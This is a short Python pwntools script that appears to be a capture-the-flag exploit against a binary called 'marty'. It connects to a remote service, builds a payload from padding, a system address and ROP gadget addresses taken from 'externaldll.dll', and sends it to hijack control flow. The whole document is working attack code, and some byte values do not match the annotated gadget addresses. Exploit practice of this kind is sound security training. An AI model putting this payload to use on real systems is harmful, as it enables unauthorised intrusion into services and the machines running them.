from pwn import *
context.log_level = 'debug'

#p = remote('52.14.117.7', 3198)
p = remote('192.168.1.211', 3198)
# p=process("./marty")

#0x625018d4 (RVA : 0x000018d4) : # POP EDI # RETN	* [externaldll.dll] *
#0x625015f4 (RVA : 0x000015f4) : # POP EBX # RETN    * [externaldll.dll] *

system="\xfc\x70\x50\x62"
g1='\xd4\x18\x50\x65'
g2='\xf4\x15\x50\x62'
target="\x80\x12\x50\x62"
protect="\x62\x50\x1b\x48"
win=system+"BBBB"+g1+"CCCC"+target+'DDDD'+target


def interact():
    p.recvuntil("OLa k aSEH\r\n")
    raw_input()
    padd="I"*22
    p.send(padd+win)
    #p.sendlineafter('>',payload)
    #p.sendline(payload)
    p.recvall()
    #raw_input()
    #info = p.recvline().splitlines()[0]
    #print(leak)
    #return info

interact()







 
#p.interactive()
